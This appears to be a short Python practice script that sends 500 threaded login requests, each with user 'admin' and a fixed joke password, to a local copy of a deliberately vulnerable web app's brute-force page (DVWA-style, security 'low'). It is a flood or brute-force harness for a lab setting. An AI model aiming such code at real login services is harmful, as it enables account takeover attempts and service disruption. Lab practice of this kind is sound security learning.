import requests
from threading import Thread


def request_100_times():
    for i in range(100):
        requests.get("http://localhost:7891/vulnerabilities/brute/", params={"username": "admin", "password": "hello my name is inigo montioia, you kiled my father, prepare to die, hello my name is inigo montioia, you kiled my father, prepare to die, hello my name is inigo montioia, you kiled my father, prepare to die, hello my name is inigo montioia, you kiled my father, prepare to die",
                                                                             "Login": "Login"}, cookies={"PHPSESSID":"d4r7bvuusln5m6op6qq25f8ui4", "security":"low"})


def main():
    threads_list = []
    for i in range(5):
        threads_list.append(Thread(target=request_100_times, daemon=True))
    for i in range(5):
        threads_list[i].start()
    for i in range(5):
        threads_list[i].join()


if __name__ == "__main__":
    main()
